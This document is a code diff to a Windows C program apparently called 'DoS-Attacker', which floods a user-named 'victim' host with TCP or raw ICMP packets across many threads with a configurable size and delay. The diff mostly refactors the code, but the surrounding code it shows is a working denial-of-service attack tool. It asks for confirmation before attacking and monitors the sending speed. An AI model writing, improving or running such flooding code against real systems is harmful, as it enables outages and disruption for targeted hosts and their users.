@@ -11,7 +11,11 @@
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
-#pragma comment(lib, "IPHLPAPI.lib")
+#pragma comment (lib, "IPHLPAPI.lib")
+#pragma warning (disable : 4244)
+#pragma warning (disable : 4267)
+#pragma warning (disable : 6385)
+#pragma warning (disable : 6386)
 
 //structures
 struct DoSInfo
@@ -20,8 +24,7 @@ struct DoSInfo
 	char* service;
 	addrinfo* hint;
 	void* pkt;
-	DWORD pkt_size;
-	DWORD delay;
+	DWORD pkt_size, delay;
 };
 
 struct ICMP_Pkt
@@ -43,7 +46,7 @@ void ErrChk(int code, const char* func)
 
 void cls(HANDLE hConsole)
 {
-	COORD coordScreen = { 0, 0 };    // home for the cursor 
+	COORD coordScreen = { 0, 0 }; // home for the cursor 
 	DWORD cCharsWritten;
 	CONSOLE_SCREEN_BUFFER_INFO csbi;
 	DWORD dwConSize;
@@ -117,13 +120,14 @@ DWORD WINAPI DoSThread(LPVOID lParam)
 	SOCKET sock = INVALID_SOCKET;
 	addrinfo* result;
 
-	//connect
+	//get the information
 	if (getaddrinfo(info->victim, info->service, info->hint, &result))
 	{
 		printf("An error %u occord in getaddrinfo.\nCheck https://docs.microsoft.com/he-il/windows/win32/winsock/windows-sockets-error-codes-2 for more information.\n", WSAGetLastError());
 		run = false;
 		exit(-1);
 	}
+	//connect
 	for (addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next)
 	{
 		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
@@ -183,7 +187,6 @@ DWORD WINAPI DoSThread(LPVOID lParam)
 				//we just need to wait... the buffer will be empty...
 				Sleep(info->delay);
 				continue;
-				break;
 			default:
 				printf("\nError \'%u\' has occord.\nCheck https://docs.microsoft.com/he-il/windows/win32/winsock/windows-sockets-error-codes-2 for specific error information.", res);
 			}
@@ -219,16 +222,16 @@ DWORD WINAPI SpeedThread(LPVOID lParam)
 	return 0;
 }
 
+#define HELPMSG puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.")
+
 int main(int argc, char** argv)
 {
-	//Dos_Attacker target_ip /port port OR /icmp __nothing__ packet_size threads delay
+	//Dos_Attacker victim /port port OR /icmp __nothing__ packet_size threads delay
 
 	BYTE* buff = NULL;
-	//SOCKET sock = INVALID_SOCKET;
-	addrinfo victim = { 0 }, * result = NULL;
+	addrinfo hint = { 0 }, * result = NULL;
 	WSADATA wsa;
-	DWORD delay = 0;
-	DWORD pkt_size = 1, max_pkt_size = SO_MAX_MSG_SIZE;
+	DWORD delay = 0, pkt_size = 1, max_pkt_size = SO_MAX_MSG_SIZE;
 	int res_size=sizeof(DWORD);
 	size_t threads_num = 2;
 	HANDLE* threads;
@@ -238,36 +241,36 @@ int main(int argc, char** argv)
 
 	if (argc < 4)
 	{
-		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+		HELPMSG;
 		return 0;
 	}
 
 	if (strcmp("/port", argv[2]) == 0 || strcmp("-port", argv[2]) == 0 || strcmp("port", argv[2]) == 0)
 	{
-		victim.ai_family = AF_UNSPEC;
-		victim.ai_socktype = SOCK_STREAM;
-		victim.ai_protocol = IPPROTO_TCP;
+		hint.ai_family = AF_UNSPEC;
+		hint.ai_socktype = SOCK_STREAM;
+		hint.ai_protocol = IPPROTO_TCP;
 		if (argc != 7)
 		{
-			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+			HELPMSG;
 			return 0;
 		}
 	}
 	else if (strcmp("/icmp", argv[2]) == 0 || strcmp("-icmp", argv[2]) == 0 || strcmp("icmp", argv[2]) == 0)
 	{
-		victim.ai_family = AF_UNSPEC;
-		victim.ai_socktype = SOCK_RAW;
-		victim.ai_protocol = IPPROTO_ICMP;
+		hint.ai_family = AF_UNSPEC;
+		hint.ai_socktype = SOCK_RAW;
+		hint.ai_protocol = IPPROTO_ICMP;
 		mode_tcp = false;
 		if (argc != 6)
 		{
-			puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+			HELPMSG;
 			return 0;
 		}
 	}
 	else
 	{
-		puts("Check https://github.com/SKC-Developer/DoS-Attacker.git for usage.");
+		HELPMSG;
 		return 0;
 	}
 
@@ -275,7 +278,7 @@ int main(int argc, char** argv)
 	pkt_size = strtoul(argv[3 + mode_tcp], NULL, 10);
 	if (pkt_size <= 0 || (mode_tcp == false && pkt_size < sizeof(ICMP_Pkt)))
 	{
-		printf("Invalid packet size.\nThe packet size of this mode should be %s.\n", (mode_tcp) ? "nonzero" : "between 16 to 65467");
+		puts("Invalid packet size.\nThe packet size must be nonzero.\n");
 		return -1;
 	}
 
@@ -311,7 +314,7 @@ int main(int argc, char** argv)
 	threads_num = strtoull(argv[4 + mode_tcp], NULL, 10);
 	if (!threads_num)
 	{
-		puts("threads_num must be nonzero.");
+		puts("Invalid threads number.\nThreads number must be nonzero.");
 		return -1;
 	}
 	threads = (HANDLE*)malloc((threads_num + 1) * sizeof(HANDLE));
@@ -321,13 +324,13 @@ int main(int argc, char** argv)
 		return -1;
 	}
 
-	delay = strtoull(argv[5 + mode_tcp], NULL, 10);
+	delay = strtoul(argv[5 + mode_tcp], NULL, 10);
 
 	printf("You have chose to attack \'%s:%s\' with a packet size of %llu, a total of %llu threads (and sockets) and a delay of %llu between packets.\nContinue? ", argv[1], (mode_tcp) ? port : "ICMP", (unsigned long long)pkt_size, threads_num, (unsigned long long)delay);
 	if (getchar() != 'y')return -1;
 
 	//set the args for the threads
-	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &victim, buff, pkt_size, delay };
+	DoSInfo info = { argv[1], (mode_tcp) ? port : NULL, &hint, buff, pkt_size, delay };
 	start = false;
 	//create the monitoring thread
 	threads[0] = CreateThread(NULL, 0, SpeedThread, argv[1], 0, NULL);
